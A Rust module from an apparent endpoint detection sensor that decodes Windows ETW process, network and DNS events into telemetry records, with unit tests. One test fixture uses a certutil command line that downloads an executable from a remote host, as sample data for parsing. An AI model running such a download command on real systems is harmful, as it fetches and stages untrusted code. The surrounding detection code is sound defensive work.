//! ETW record → TRAPD event mapping (platform-neutral, unit-tested anywhere).
//!
//! The Windows ETW sensor (`collectors::windows::etw`) decodes each event with
//! TDH into an [`EtwRecord`]: provider, event id, header PID/time and the named
//! properties. Everything after that — which provider/event means what, how
//! addresses and ports are laid out, how NT device paths become drive paths —
//! lives here, so it is tested without a Windows kernel.
//!
//! Providers (GUIDs verified against the published manifests):
//!
//! | Provider | GUID | Keywords | Events |
//! |---|---|---|---|
//! | Microsoft-Windows-Kernel-Process | `22fb2cd6-0e7b-422b-a0c7-2fad1fd0e716` | `0x10` process, `0x40` image | 1 ProcessStart, 2 ProcessStop, 5 ImageLoad |
//! | Microsoft-Windows-Kernel-Network | `7dd42a49-5329-4832-8dfd-43d979153a88` | `0x10` IPv4, `0x20` IPv6 | 12/28 connect, 15/31 accept |
//! | Microsoft-Windows-DNS-Client | `1c95126e-7eea-49a9-a3fe-a378b03ddb4d` | all | 3008 query completed |
//!
//! Property names differ slightly between Windows builds (`ImageName` vs.
//! `ImageFileName`, `ParentProcessID` vs. `ParentId`); every lookup accepts the
//! known aliases.

use std::collections::HashMap;
use std::net::{Ipv4Addr, Ipv6Addr};

use crate::schema::{
    DnsResolutionData, NetworkConnectionData, ProcessCreateData, ProcessTerminateData,
};

pub const KERNEL_PROCESS: u128 = 0x22fb2cd6_0e7b_422b_a0c7_2fad1fd0e716;
pub const KERNEL_NETWORK: u128 = 0x7dd42a49_5329_4832_8dfd_43d979153a88;
pub const DNS_CLIENT: u128 = 0x1c95126e_7eea_49a9_a3fe_a378b03ddb4d;

#[cfg_attr(not(windows), allow(dead_code))]
pub const KERNEL_PROCESS_KEYWORDS: u64 = 0x10 | 0x40;
#[cfg_attr(not(windows), allow(dead_code))]
pub const KERNEL_NETWORK_KEYWORDS: u64 = 0x10 | 0x20;

/// One decoded property value.
#[derive(Debug, Clone, PartialEq)]
pub enum EtwValue {
    Str(String),
    /// Integer value plus its raw little-endian bytes (ports and IPv4
    /// addresses are stored in network byte order and need the raw form).
    Int(u64, Vec<u8>),
    Bytes(Vec<u8>),
}

/// A decoded ETW event.
#[derive(Debug, Clone, Default)]
pub struct EtwRecord {
    pub provider: u128,
    pub id: u16,
    /// `EVENT_HEADER.ProcessId` — the process that *logged* the event.
    pub header_pid: u32,
    /// `EVENT_HEADER.TimeStamp` as FILETIME ticks.
    #[cfg_attr(not(windows), allow(dead_code))]
    pub timestamp: i64,
    pub props: HashMap<String, EtwValue>,
    /// Process context read in the ETW callback itself, the earliest point
    /// user mode sees a `ProcessStart`. Only set for Kernel-Process event 1.
    #[cfg_attr(not(windows), allow(dead_code))]
    pub captured: Option<ProcessEnrichment>,
}

impl EtwRecord {
    fn get(&self, names: &[&str]) -> Option<&EtwValue> {
        names.iter().find_map(|n| self.props.get(*n))
    }
    pub fn str(&self, names: &[&str]) -> Option<String> {
        match self.get(names)? {
            EtwValue::Str(s) => Some(s.clone()),
            _ => None,
        }
    }
    pub fn int(&self, names: &[&str]) -> Option<u64> {
        match self.get(names)? {
            EtwValue::Int(v, _) => Some(*v),
            _ => None,
        }
    }
    fn raw(&self, names: &[&str]) -> Option<Vec<u8>> {
        match self.get(names)? {
            EtwValue::Int(_, raw) | EtwValue::Bytes(raw) => Some(raw.clone()),
            EtwValue::Str(_) => None,
        }
    }
}

/// ETW session uses system-time ticks (FILETIME), never QPC ticks.
#[cfg_attr(not(windows), allow(dead_code))]
pub fn filetime_timestamp(ticks: i64) -> Option<chrono::DateTime<chrono::Utc>> {
    if ticks <= 0 {
        return None;
    }
    let unix_ticks = ticks.checked_sub(116_444_736_000_000_000)?;
    chrono::DateTime::from_timestamp(
        unix_ticks.div_euclid(10_000_000),
        (unix_ticks.rem_euclid(10_000_000) * 100) as u32,
    )
}

/// NT device prefix → drive, e.g. (`\Device\HarddiskVolume3`, `C:`).
pub type DeviceMap = Vec<(String, String)>;

/// `\Device\HarddiskVolume3\Windows\System32\cmd.exe` → `C:\Windows\…`.
/// Paths already in drive form pass through; unknown devices stay as they are
/// (still useful as evidence, and never mistaken for a drive path).
pub fn device_to_dos(path: &str, devices: &DeviceMap) -> String {
    let path = path.strip_prefix("\\??\\").unwrap_or(path);
    for (device, drive) in devices {
        if path.len() > device.len()
            && path
                .get(..device.len())
                .is_some_and(|p| p.eq_ignore_ascii_case(device))
            && path.as_bytes()[device.len()] == b'\\'
        {
            return format!("{drive}{}", &path[device.len()..]);
        }
    }
    path.to_string()
}

fn basename(path: &str) -> String {
    path.rsplit(['\\', '/']).next().unwrap_or(path).to_string()
}

/// What a process start needs from outside the event (looked up while the
/// process is still alive): command line, account and image hash.
#[derive(Debug, Clone, Default)]
pub struct ProcessEnrichment {
    pub exe: Option<String>,
    pub cmdline: Option<String>,
    pub username: Option<String>,
    pub exe_sha256: Option<String>,
}

impl ProcessEnrichment {
    /// Field-wise merge: values already present win, `fallback` fills the
    /// gaps. Empty strings count as missing, so a failed read never masks a
    /// later successful one.
    pub fn prefer_over(self, fallback: ProcessEnrichment) -> ProcessEnrichment {
        fn pick(a: Option<String>, b: Option<String>) -> Option<String> {
            a.filter(|v| !v.is_empty()).or(b.filter(|v| !v.is_empty()))
        }
        ProcessEnrichment {
            exe: pick(self.exe, fallback.exe),
            cmdline: pick(self.cmdline, fallback.cmdline),
            username: pick(self.username, fallback.username),
            exe_sha256: pick(self.exe_sha256, fallback.exe_sha256),
        }
    }
}

/// Enrichment is valid only for the generation that produced this source event.
pub fn same_process_generation(start: Option<u64>, current: Option<u64>, observed: i64) -> bool {
    start.is_some_and(|s| s > 0 && current == Some(s) && observed >= 0 && observed as u64 >= s)
}

/// Kernel-Process event 1 → process create.
pub fn process_start(
    rec: &EtwRecord,
    devices: &DeviceMap,
    enrich: ProcessEnrichment,
) -> Option<ProcessCreateData> {
    if rec.provider != KERNEL_PROCESS || rec.id != 1 {
        return None;
    }
    let pid = i32::try_from(rec.int(&["ProcessID", "ProcessId"])?).ok()?;
    let ppid = rec
        .int(&["ParentProcessID", "ParentId", "ParentProcessId"])
        .and_then(|p| i32::try_from(p).ok())
        .unwrap_or(0);
    let image = rec
        .str(&["ImageName", "ImageFileName"])
        .map(|p| device_to_dos(&p, devices))
        .unwrap_or_default();
    let exe = enrich.exe.filter(|e| !e.is_empty()).unwrap_or(image);
    let mut notes = crate::telemetry::Enrichment::new();
    // Source order: the kernel's own payload (authoritative, race-free, when
    // the manifest carries it), then what the callback read at start, then a
    // late lookup. The cap matches the polling collector's contract.
    let from_payload = rec.str(&["CommandLine"]).filter(|c| !c.is_empty());
    let (cmdline, truncation) = crate::telemetry::limits::truncate_str(
        &from_payload.or(enrich.cmdline).unwrap_or_default(),
        crate::telemetry::limits::MAX_CMDLINE_BYTES,
    );
    notes.truncated("cmdline", truncation);
    if cmdline.is_empty() {
        // The process exited before any read could succeed; the start itself
        // is still recorded (Security 4688 can still supply the command line
        // to detection).
        notes.fail("cmdline", crate::telemetry::EnrichmentError::IoError);
    }
    let username = enrich.username.unwrap_or_else(|| "unknown".into());
    if username == "unknown" {
        notes.fail("username", crate::telemetry::EnrichmentError::IoError);
    }
    Some(ProcessCreateData {
        pid,
        ppid,
        name: basename(&exe),
        exe,
        cmdline,
        uid: 0,
        username,
        exe_sha256: enrich.exe_sha256,
        process_start_time: rec.int(&["CreateTime"]).filter(|t| *t > 0),
        parent_start_time: None,
        enrichment: notes.finish(0),
    })
}

/// Kernel-Process event 2 → process terminate.
pub fn process_stop(rec: &EtwRecord, devices: &DeviceMap) -> Option<ProcessTerminateData> {
    if rec.provider != KERNEL_PROCESS || rec.id != 2 {
        return None;
    }
    let pid = i32::try_from(rec.int(&["ProcessID", "ProcessId"])?).ok()?;
    let name = rec
        .str(&["ImageName", "ImageFileName"])
        .map(|p| basename(&device_to_dos(&p, devices)))
        .unwrap_or_default();
    Some(ProcessTerminateData { pid, name })
}

/// Kernel-Process event 5 → (pid, loaded image path).
pub fn image_load(rec: &EtwRecord, devices: &DeviceMap) -> Option<(i32, String)> {
    if rec.provider != KERNEL_PROCESS || rec.id != 5 {
        return None;
    }
    let pid = i32::try_from(rec.int(&["ProcessID", "ProcessId"])?).ok()?;
    let image = rec.str(&["ImageName", "FileName"])?;
    Some((pid, device_to_dos(&image, devices)))
}

/// Address property → text. IPv4 arrives as a 4-byte integer in network
/// order, IPv6 as 16 raw bytes.
fn address(rec: &EtwRecord, name: &str) -> Option<String> {
    let raw = rec.raw(&[name])?;
    match raw.len() {
        4 => Some(Ipv4Addr::new(raw[0], raw[1], raw[2], raw[3]).to_string()),
        16 => {
            let mut b = [0u8; 16];
            b.copy_from_slice(&raw);
            Some(Ipv6Addr::from(b).to_string())
        }
        _ => None,
    }
}

/// Port property → host order (stored big-endian on the wire).
fn port(rec: &EtwRecord, name: &str) -> Option<u16> {
    let raw = rec.raw(&[name])?;
    (raw.len() == 2).then(|| u16::from_be_bytes([raw[0], raw[1]]))
}

/// Kernel-Network connect/accept → connection record.
pub fn network_connection(
    rec: &EtwRecord,
    process: Option<String>,
) -> Option<NetworkConnectionData> {
    if rec.provider != KERNEL_NETWORK {
        return None;
    }
    let inbound = match rec.id {
        12 | 28 => false,
        15 | 31 => true,
        _ => return None,
    };
    let pid = rec.int(&["PID"]).and_then(|p| i32::try_from(p).ok());
    let daddr = address(rec, "daddr")?;
    let saddr = address(rec, "saddr")?;
    let dport = port(rec, "dport")?;
    let sport = port(rec, "sport")?;
    let v6 = daddr.contains(':');
    // The provider reports both directions from the local socket's view:
    // `saddr`/`sport` are local for a connect, remote for an accept.
    let (src_addr, src_port, dst_addr, dst_port) = if inbound {
        (daddr, dport, saddr, sport)
    } else {
        (saddr, sport, daddr, dport)
    };
    Some(NetworkConnectionData {
        protocol: if v6 { "tcp6" } else { "tcp" }.into(),
        src_addr,
        src_port,
        dst_addr,
        dst_port,
        state: if inbound { "accepted" } else { "established" }.into(),
        pid,
        process_start_time: None,
        process,
        duration_ms: None,
        bytes_sent: None,
        bytes_recv: None,
        packets_sent: None,
        packets_recv: None,
        rtt_us: None,
    })
}

fn qtype_name(t: u64) -> String {
    match t {
        1 => "A".into(),
        2 => "NS".into(),
        5 => "CNAME".into(),
        6 => "SOA".into(),
        12 => "PTR".into(),
        15 => "MX".into(),
        16 => "TXT".into(),
        28 => "AAAA".into(),
        33 => "SRV".into(),
        65 => "HTTPS".into(),
        255 => "ANY".into(),
        other => format!("TYPE{other}"),
    }
}

/// `QueryStatus` (Win32/DNS error code) → DNS response code text.
///
/// DNS RCODEs surface as `DNS_ERROR_RCODE_*` (9001..9010, windns.h). Statuses
/// that are not a DNS response code (transport errors, `ERROR_INVALID_PARAMETER`
/// = 87, ...) map to `UNKNOWN` rather than leaking a Win32 number into a field
/// whose contract is an RCODE name.
fn rcode(status: u64) -> &'static str {
    match status {
        0 => "NOERROR",
        9001 => "FORMERR",
        9002 => "SERVFAIL",
        9003 => "NXDOMAIN",
        9004 => "NOTIMP",
        9005 => "REFUSED",
        9006 => "YXDOMAIN",
        9007 => "YXRRSET",
        9008 => "NXRRSET",
        9009 => "NOTAUTH",
        9010 => "NOTZONE",
        // DNS_INFO_NO_RECORDS / DNS_ERROR_RECORD_DOES_NOT_EXIST: the name
        // resolved but holds no record of the requested type (NODATA).
        9501 | 9701 => "NODATA",
        // ERROR_TIMEOUT / DNS timeout / WSAETIMEDOUT.
        258 | 1460 | 10060 => "TIMEOUT",
        _ => "UNKNOWN",
    }
}

/// Parses the `QueryResults` text of DNS-Client events, e.g.
/// `"10.0.0.5;::ffff:10.0.0.5;type:  5 cdn.example;type:  6 ns1.example admin.example 1 900 ...;"`.
///
/// Only address entries and CNAME (type 5) entries belong to the answer.
/// Other `type:` entries (SOA 6, NS 2, ...) are authority records of a
/// negative response and must not be reported as aliases.
fn parse_query_results(text: &str) -> (Vec<String>, Vec<String>) {
    let (mut ips, mut cnames) = (Vec::new(), Vec::new());
    for part in text.split(';') {
        let part = part.trim();
        if part.is_empty() {
            continue;
        }
        if let Some(rest) = part.strip_prefix("type:") {
            let mut fields = rest.split_whitespace();
            if fields.next() == Some("5") {
                if let Some(name) = fields.next() {
                    cnames.push(name.trim_end_matches('.').to_string());
                }
            }
        } else if part.parse::<std::net::IpAddr>().is_ok() {
            let ip = part.strip_prefix("::ffff:").unwrap_or(part).to_string();
            if !ips.contains(&ip) {
                ips.push(ip);
            }
        }
    }
    (ips, cnames)
}

/// DNS-Client event 3008 (query completed) → resolution record. Returns the
/// PID that logged the event alongside; the DNS-Client library runs in the
/// querying process, so this is the requester unless it is the Dnscache
/// service host (shared-cache lookups).
pub fn dns_query(rec: &EtwRecord) -> Option<(u32, DnsResolutionData)> {
    if rec.provider != DNS_CLIENT || rec.id != 3008 {
        return None;
    }
    let qname = rec.str(&["QueryName"])?.trim_end_matches('.').to_string();
    if qname.is_empty() {
        return None;
    }
    let qtype = qtype_name(rec.int(&["QueryType"]).unwrap_or(0));
    let status = rec.int(&["QueryStatus", "Status"]).unwrap_or(0);
    let (ips, cnames) = parse_query_results(&rec.str(&["QueryResults"]).unwrap_or_default());
    Some((
        rec.header_pid,
        DnsResolutionData {
            qname,
            qtype,
            resolved_ips: ips,
            cnames,
            server_addr: String::new(),
            client_addr: String::new(),
            transaction_id: 0,
            rcode: rcode(status).to_string(),
            pid: None,
            process: None,
            process_start_time: None,
        },
    ))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn rec(provider: u128, id: u16, props: &[(&str, EtwValue)]) -> EtwRecord {
        EtwRecord {
            provider,
            id,
            header_pid: 4,
            timestamp: 0,
            props: props
                .iter()
                .map(|(k, v)| (k.to_string(), v.clone()))
                .collect(),
            captured: None,
        }
    }
    fn int(v: u64, width: usize) -> EtwValue {
        EtwValue::Int(v, v.to_le_bytes()[..width].to_vec())
    }
    fn s(v: &str) -> EtwValue {
        EtwValue::Str(v.into())
    }

    fn devices() -> DeviceMap {
        vec![
            ("\\Device\\HarddiskVolume3".into(), "C:".into()),
            ("\\Device\\HarddiskVolume10".into(), "D:".into()),
        ]
    }

    #[test]
    fn reused_pid_and_old_records_are_not_enriched() {
        assert!(same_process_generation(Some(100), Some(100), 120));
        assert!(!same_process_generation(Some(100), Some(200), 120));
        assert!(!same_process_generation(Some(100), Some(100), 90));
        assert!(!same_process_generation(None, Some(100), 120));
        assert!(!same_process_generation(Some(100), None, 120));
    }

    #[test]
    fn event_filetime_keeps_sensor_time_and_unicode_device_paths_do_not_panic() {
        assert_eq!(
            filetime_timestamp(116_444_736_000_000_000)
                .unwrap()
                .timestamp(),
            0
        );
        assert!(filetime_timestamp(0).is_none());
        assert_eq!(
            device_to_dos("aéabc", &vec![("ab".into(), "C:".into())]),
            "aéabc"
        );
    }

    #[test]
    fn device_paths_map_to_drives() {
        let d = devices();
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume3\\Windows\\System32\\cmd.exe", &d),
            "C:\\Windows\\System32\\cmd.exe"
        );
        // Volume3 must not match Volume30 / the Volume10 prefix of another.
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume10\\x.exe", &d),
            "D:\\x.exe"
        );
        assert_eq!(
            device_to_dos("\\Device\\HarddiskVolume30\\x.exe", &d),
            "\\Device\\HarddiskVolume30\\x.exe"
        );
        assert_eq!(device_to_dos("\\??\\C:\\x.exe", &d), "C:\\x.exe");
        assert_eq!(device_to_dos("C:\\x.exe", &d), "C:\\x.exe");
    }

    #[test]
    fn process_start_uses_enrichment_and_survives_without_it() {
        let r = rec(
            KERNEL_PROCESS,
            1,
            &[
                ("ProcessID", int(4242, 4)),
                ("ParentProcessID", int(1000, 4)),
                ("CreateTime", int(133_000_000_000_000_000, 8)),
                (
                    "ImageName",
                    s("\\Device\\HarddiskVolume3\\Windows\\System32\\certutil.exe"),
                ),
            ],
        );
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some("certutil -urlcache -f http://x/a.exe a.exe".into()),
                username: Some("CORP\\anna".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!((p.pid, p.ppid), (4242, 1000));
        assert_eq!(p.exe, "C:\\Windows\\System32\\certutil.exe");
        assert_eq!(p.name, "certutil.exe");
        assert_eq!(p.process_start_time, Some(133_000_000_000_000_000));
        assert_eq!(p.username, "CORP\\anna");

        // A process gone before enrichment still yields an event.
        let p = process_start(&r, &devices(), ProcessEnrichment::default()).unwrap();
        assert!(p.cmdline.is_empty());
        assert_eq!(p.username, "unknown");

        // Aliases of older builds.
        let old = rec(
            KERNEL_PROCESS,
            1,
            &[
                ("ProcessId", int(7, 4)),
                ("ParentId", int(6, 4)),
                ("ImageFileName", s("C:\\a.exe")),
            ],
        );
        assert_eq!(
            process_start(&old, &devices(), ProcessEnrichment::default())
                .unwrap()
                .ppid,
            6
        );
        assert!(process_start(
            &rec(KERNEL_NETWORK, 1, &[]),
            &devices(),
            ProcessEnrichment::default()
        )
        .is_none());
    }

    #[test]
    fn process_stop_and_image_load() {
        let stop = rec(
            KERNEL_PROCESS,
            2,
            &[
                ("ProcessID", int(9, 4)),
                ("ImageName", s("\\Device\\HarddiskVolume3\\x\\y.exe")),
            ],
        );
        assert_eq!(process_stop(&stop, &devices()).unwrap().name, "y.exe");
        let load = rec(
            KERNEL_PROCESS,
            5,
            &[
                ("ProcessID", int(9, 4)),
                (
                    "ImageName",
                    s("\\Device\\HarddiskVolume3\\Users\\a\\AppData\\x.dll"),
                ),
            ],
        );
        assert_eq!(
            image_load(&load, &devices()).unwrap(),
            (9, "C:\\Users\\a\\AppData\\x.dll".to_string())
        );
    }

    #[test]
    fn network_connect_decodes_network_order() {
        // 10.20.0.5:443 ← 10.20.0.50:51000, as the provider stores them.
        let r = rec(
            KERNEL_NETWORK,
            12,
            &[
                ("PID", int(1234, 4)),
                ("daddr", EtwValue::Int(0, vec![10, 20, 0, 5])),
                ("saddr", EtwValue::Int(0, vec![10, 20, 0, 50])),
                ("dport", EtwValue::Int(0, 443u16.to_be_bytes().to_vec())),
                ("sport", EtwValue::Int(0, 51000u16.to_be_bytes().to_vec())),
            ],
        );
        let c = network_connection(&r, Some("x.exe".into())).unwrap();
        assert_eq!(
            (c.dst_addr.as_str(), c.dst_port, c.src_port),
            ("10.20.0.5", 443, 51000)
        );
        assert_eq!(c.pid, Some(1234));
        assert_eq!(c.state, "established");

        let mut accept = r.clone();
        accept.id = 15;
        let a = network_connection(&accept, None).unwrap();
        assert_eq!(
            (a.dst_addr.as_str(), a.dst_port, a.state.as_str()),
            ("10.20.0.50", 51000, "accepted")
        );

        let mut v6 = r.clone();
        v6.id = 28;
        v6.props.insert(
            "daddr".into(),
            EtwValue::Bytes("2001:db8::1".parse::<Ipv6Addr>().unwrap().octets().to_vec()),
        );
        v6.props.insert(
            "saddr".into(),
            EtwValue::Bytes(Ipv6Addr::LOCALHOST.octets().to_vec()),
        );
        let c6 = network_connection(&v6, None).unwrap();
        assert_eq!(
            (c6.protocol.as_str(), c6.dst_addr.as_str()),
            ("tcp6", "2001:db8::1")
        );

        let mut other = r.clone();
        other.id = 10; // data sent: not a connection start
        assert!(network_connection(&other, None).is_none());
    }

    #[test]
    fn dns_query_parses_results() {
        let r = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("login.microsoftonline.com.")),
                ("QueryType", int(1, 2)),
                ("QueryStatus", int(0, 4)),
                (
                    "QueryResults",
                    s("type:  5 login.mso.msidentity.com;20.190.159.0;::ffff:20.190.159.0;"),
                ),
            ],
        );
        let (pid, d) = dns_query(&r).unwrap();
        assert_eq!(pid, 4);
        assert_eq!(d.qname, "login.microsoftonline.com");
        assert_eq!(d.qtype, "A");
        assert_eq!(d.rcode, "NOERROR");
        assert_eq!(d.cnames, vec!["login.mso.msidentity.com".to_string()]);
        assert_eq!(d.resolved_ips, vec!["20.190.159.0".to_string()]);

        let nx = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("nope.corp")),
                ("QueryType", int(28, 2)),
                ("QueryStatus", int(9003, 4)),
            ],
        );
        let (_, d) = dns_query(&nx).unwrap();
        assert_eq!((d.qtype.as_str(), d.rcode.as_str()), ("AAAA", "NXDOMAIN"));
        assert!(dns_query(&rec(DNS_CLIENT, 3006, &[("QueryName", s("x"))])).is_none());
    }

    #[test]
    fn dns_authority_records_are_not_cnames() {
        // Negative answer: Windows lists the zone's SOA (type 6), whose first
        // field is the primary nameserver. That is not an alias.
        let r = rec(
            DNS_CLIENT,
            3008,
            &[
                ("QueryName", s("nope.example.com")),
                ("QueryType", int(1, 2)),
                ("QueryStatus", int(9003, 4)),
                (
                    "QueryResults",
                    s("type:  6 ns1.example.com hostmaster.example.com 1 900 300 604800 60;"),
                ),
            ],
        );
        let (_, d) = dns_query(&r).unwrap();
        assert_eq!(d.rcode, "NXDOMAIN");
        assert!(d.cnames.is_empty(), "{:?}", d.cnames);
        assert!(d.resolved_ips.is_empty());

        let (ips, cnames) = parse_query_results(
            "type:  5 a.example;type:  2 ns.example;1.2.3.4;1.2.3.4;::ffff:1.2.3.4;2001:db8::1;",
        );
        assert_eq!(cnames, vec!["a.example".to_string()]);
        assert_eq!(ips, vec!["1.2.3.4".to_string(), "2001:db8::1".to_string()]);
    }

    #[test]
    fn rcode_maps_dns_statuses_and_never_leaks_win32_numbers() {
        for (status, want) in [
            (0, "NOERROR"),
            (9001, "FORMERR"),
            (9002, "SERVFAIL"),
            (9003, "NXDOMAIN"),
            (9004, "NOTIMP"),
            (9005, "REFUSED"),
            (9009, "NOTAUTH"),
            (9501, "NODATA"),
            (9701, "NODATA"),
            (1460, "TIMEOUT"),
            (10060, "TIMEOUT"),
            (87, "UNKNOWN"),
            (123_456, "UNKNOWN"),
        ] {
            assert_eq!(rcode(status), want, "status {status}");
        }
    }

    #[test]
    fn process_start_prefers_payload_then_early_capture_and_caps_length() {
        let base = [
            ("ProcessID", int(4242, 4)),
            ("CreateTime", int(133_000_000_000_000_000, 8)),
            ("ImageName", s("C:\\Windows\\System32\\cmd.exe")),
        ];
        // The kernel payload beats a (possibly stale) captured value.
        let mut props = base.to_vec();
        props.push(("CommandLine", s("cmd /c echo payload")));
        let p = process_start(
            &rec(KERNEL_PROCESS, 1, &props),
            &devices(),
            ProcessEnrichment {
                cmdline: Some("cmd /c echo captured".into()),
                username: Some("CORP\\anna".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(p.cmdline, "cmd /c echo payload");
        assert!(p.enrichment.enrichment_errors.is_empty());

        // Without a payload the early capture is used.
        let r = rec(KERNEL_PROCESS, 1, &base);
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some("cmd /c echo captured".into()),
                username: Some("CORP\\anna".into()),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(p.cmdline, "cmd /c echo captured");

        // Nothing at all: partial, both fields reported.
        let p = process_start(&r, &devices(), ProcessEnrichment::default()).unwrap();
        assert!(p.cmdline.is_empty() && p.username == "unknown");
        assert!(p.enrichment.enrichment_errors.contains_key("cmdline"));
        assert!(p.enrichment.enrichment_errors.contains_key("username"));

        // Oversized command lines are capped and marked.
        let huge = "x".repeat(crate::telemetry::limits::MAX_CMDLINE_BYTES + 10);
        let p = process_start(
            &r,
            &devices(),
            ProcessEnrichment {
                cmdline: Some(huge),
                ..Default::default()
            },
        )
        .unwrap();
        assert_eq!(p.cmdline.len(), crate::telemetry::limits::MAX_CMDLINE_BYTES);
        assert!(p.enrichment.truncated_fields.contains_key("cmdline"));
    }

    #[test]
    fn early_capture_wins_and_late_lookup_fills_gaps() {
        let early = ProcessEnrichment {
            cmdline: Some("reg add HKCU\\x".into()),
            username: Some(String::new()), // failed read counts as missing
            ..Default::default()
        };
        let late = ProcessEnrichment {
            exe: Some("C:\\Windows\\System32\\reg.exe".into()),
            cmdline: Some("stale".into()),
            username: Some("CORP\\anna".into()),
            exe_sha256: Some("sha256:ab".into()),
        };
        let m = early.prefer_over(late);
        assert_eq!(m.cmdline.as_deref(), Some("reg add HKCU\\x"));
        assert_eq!(m.username.as_deref(), Some("CORP\\anna"));
        assert_eq!(m.exe.as_deref(), Some("C:\\Windows\\System32\\reg.exe"));
        assert_eq!(m.exe_sha256.as_deref(), Some("sha256:ab"));
        let none = ProcessEnrichment::default().prefer_over(ProcessEnrichment::default());
        assert!(none.cmdline.is_none() && none.username.is_none());
    }
}
